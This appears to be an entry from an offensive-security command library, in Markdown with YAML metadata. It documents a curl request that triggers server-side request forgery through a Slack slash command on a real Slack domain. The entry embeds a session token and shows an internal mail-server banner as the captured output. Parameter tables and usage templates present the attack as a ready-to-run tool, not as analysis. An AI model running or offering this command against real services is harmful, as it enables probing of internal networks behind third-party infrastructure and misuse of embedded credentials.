---
data: >-
  curl -X POST https://agarri.slack.com/api/chat.command?t=1431286754 -H
  "Content-Type: application/x-www-form-urlencoded" -d
  "agent=webapp&command=/ssrf&text=&channel=C04QDFHLT&token=xoxs-4829527689-4829527691-4814341714-d0346ec616&set_active=true&_attempts=1"
tags:
  - ssrf
  - execution
type: command
output: >-
  {"ok":true,"response":"220 squid3.tinyspeck.com ESMTP Postfix\r\n221 2.7.0
  Error: I can break rules, too. Goodbye.\r\n"}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.350Z'
id: 987e7d9f-54cd-4a7f-999a-360d5ddc8a35
verified: false
validated: true
submitted: true
---
# execute-slack-ssrf-command

## Command

```bash
curl -X POST https://agarri.slack.com/api/chat.command?t=1431286754 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "agent=webapp&command=/ssrf&text=&channel=C04QDFHLT&token=xoxs-4829527689-4829527691-4814341714-d0346ec616&set_active=true&_attempts=1"
```

## Description

Executes a Slack slash command to trigger SSRF, fetching the configured internal URL and returning service responses in the API output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `token` | OAuth token for auth | Yes |
| `command` | Command to run, e.g., /ssrf | Yes |
| `channel` | Target channel ID | Yes |
| `agent` | Client type (webapp) | Yes |
| `set_active` | Activate command (true) | No |

## Examples

### Basic Usage

```bash
curl -X POST https://your-slack.com/api/chat.command \
  -d "token=TOKEN&command=/ssrf&channel=CHAN"
```

### Advanced Usage

```bash
curl -X POST ... -d "...&text=probe&_attempts=1"
```

## Expected Output

JSON with 'response' containing internal service banner, e.g., SMTP Postfix output.

## Related

- [[commands/configure-slack-ssrf-slash-command]]
- [[procedures/Execute-Slack-Slash-Command-to-Trigger-SSRF]]
